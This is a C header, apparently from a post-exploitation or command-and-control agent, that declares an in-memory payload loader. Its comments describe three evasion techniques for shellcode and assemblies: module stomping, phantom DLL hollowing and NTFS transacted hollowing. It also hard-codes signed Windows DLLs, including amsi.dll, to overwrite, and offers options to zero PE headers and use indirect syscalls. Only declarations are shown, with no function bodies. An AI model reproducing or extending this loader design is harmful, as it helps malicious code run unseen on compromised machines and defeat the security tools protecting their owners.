/*
 * postex_loader.h — Post-exploitation payload loading techniques.
 *
 * Provides multiple methods for loading payloads (BOFs, assemblies,
 * shellcode) into memory while evading image-load callbacks and
 * memory scanners.
 *
 * Techniques:
 *   1. MODULE STOMPING: Load a legitimate signed DLL, overwrite its
 *      .text section with our payload. The memory region is backed by
 *      a legitimate file on disk — scanners see "legit.dll" not shellcode.
 *
 *   2. PHANTOM DLL HOLLOWING: Create a section from a legit DLL on disk
 *      using NtCreateSection(SEC_IMAGE), map it, then overwrite .text
 *      BEFORE the image is linked into the PEB. The DLL never executes
 *      its real code.
 *
 *   3. TRANSACTED HOLLOWING: Use NTFS transactions to temporarily
 *      replace a DLL on disk, create a section from it, then roll back
 *      the transaction. The mapped image contains our payload but the
 *      file on disk is unchanged.
 */
#ifndef POSTEX_LOADER_H
#define POSTEX_LOADER_H

#include <windows.h>

/* ─── Load technique selection ─── */
typedef enum _LOAD_TECHNIQUE {
    LOAD_MODULE_STOMP    = 0,   /* Overwrite .text of loaded DLL */
    LOAD_PHANTOM_HOLLOW  = 1,   /* Map section, overwrite before link */
    LOAD_TRANSACTED      = 2,   /* NTFS transaction hollowing */
} LOAD_TECHNIQUE;

/* ─── Options for payload loading ─── */
typedef struct _LOAD_OPTS {
    LOAD_TECHNIQUE technique;
    const wchar_t *sacrificialDll;  /* DLL to stomp/hollow (NULL = auto-select) */
    BOOL           stompHeaders;    /* Zero PE headers after loading */
    BOOL           useIndirectSyscalls; /* Use Sw_* wrappers for Nt calls */
} LOAD_OPTS;

/* ─── Result of a load operation ─── */
typedef struct _LOAD_RESULT {
    BOOL    success;
    void   *baseAddress;        /* Where the payload was loaded */
    SIZE_T  regionSize;         /* Size of the mapped/allocated region */
    HMODULE hStompedModule;     /* Handle of stomped DLL (for MODULE_STOMP) */
    DWORD   lastError;          /* GetLastError() on failure */
    char    errorMsg[256];
} LOAD_RESULT;

/*
 * Default sacrificial DLLs — legitimate signed Microsoft DLLs that are:
 *   - Large enough to hold typical payloads (>100KB .text)
 *   - Not commonly loaded (won't conflict with agent)
 *   - Present on all Windows versions
 */
#define STOMP_DLL_DEFAULT   L"C:\\Windows\\System32\\amsi.dll"
#define STOMP_DLL_ALT1      L"C:\\Windows\\System32\\dbghelp.dll"
#define STOMP_DLL_ALT2      L"C:\\Windows\\System32\\wldp.dll"
#define STOMP_DLL_ALT3      L"C:\\Windows\\System32\\srvcli.dll"

/*
 * Load a payload using the specified technique.
 *
 * payload/payloadLen: raw bytes to load (shellcode, BOF, etc.)
 * opts: loading options (technique, sacrificial DLL, etc.)
 * result: output — base address, error info
 *
 * Returns TRUE on success. Caller must eventually call postex_unload()
 * to clean up.
 */
BOOL postex_load(const unsigned char *payload, SIZE_T payloadLen,
                 const LOAD_OPTS *opts, LOAD_RESULT *result);

/*
 * Unload/cleanup a previously loaded payload.
 * Zeros the memory before freeing.
 */
void postex_unload(LOAD_RESULT *result);

/*
 * Get the .text section info of a loaded module.
 * Used to check if a sacrificial DLL's .text is large enough.
 */
BOOL postex_get_text_section(HMODULE hMod, void **textBase, DWORD *textSize);

/*
 * Auto-select a sacrificial DLL whose .text section is >= minSize.
 * Returns the path, or NULL if none found.
 * The returned string is static — do not free.
 */
const wchar_t *postex_select_stomp_dll(SIZE_T minSize);

#endif /* POSTEX_LOADER_H */
